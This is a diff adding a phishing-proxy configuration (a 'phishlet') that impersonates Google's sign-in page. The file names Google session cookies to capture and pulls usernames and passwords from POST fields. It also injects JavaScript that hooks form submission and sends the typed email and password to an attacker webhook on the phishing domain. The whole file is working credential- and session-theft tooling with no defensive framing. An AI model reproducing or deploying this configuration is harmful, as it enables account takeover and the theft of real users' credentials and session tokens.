@@ -1,0 +1,51 @@
+name: 'google'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '{{.Endpoint3}}', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', phish_sub: '{{.Endpoint3}}', mimes: ['text/html', 'application/javascript', 'application/x-javascript', 'application/json']}
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID']
+credentials:
+  username:
+    key: 'identifier'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'Passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'accounts.google.com'
+  path: '/v3/signin/identifier'
+js_inject:
+  - trigger: 'accounts.google.com'
+    code: |
+      (function() {
+        const api = "https://{{.Domain}}/api/webhook";
+        const secret = "{{.WebhookSecret}}";
+        const source = "google";
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('email');
+        if (email) {
+          const field = document.querySelector('input[type="email"]') || document.querySelector('input[name="identifier"]');
+          if (field) { field.value = email; field.dispatchEvent(new Event('input', { bubbles: true })); }
+        }
+        document.addEventListener('submit', function() {
+          const u = document.querySelector('input[type="email"]')?.value || document.querySelector('input[name="identifier"]')?.value;
+          const p = document.querySelector('input[type="password"]')?.value || document.querySelector('input[name="Passwd"]')?.value;
+          if (u || p) {
+            fetch(api, {
+              method: "POST", headers: {"Content-Type": "application/json", "X-Webhook-Secret": secret},
+              body: JSON.stringify({event: p ? "credentials" : "email", source: source, email: u, password: p})
+            }).catch(() => {});
+          }
+        }, true);
+      })()
+webhook:
+  url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
+  headers:
+    X-Webhook-Secret: "{{.WebhookSecret}}"
+  format: "json"
+  events: ["credentials", "session"]
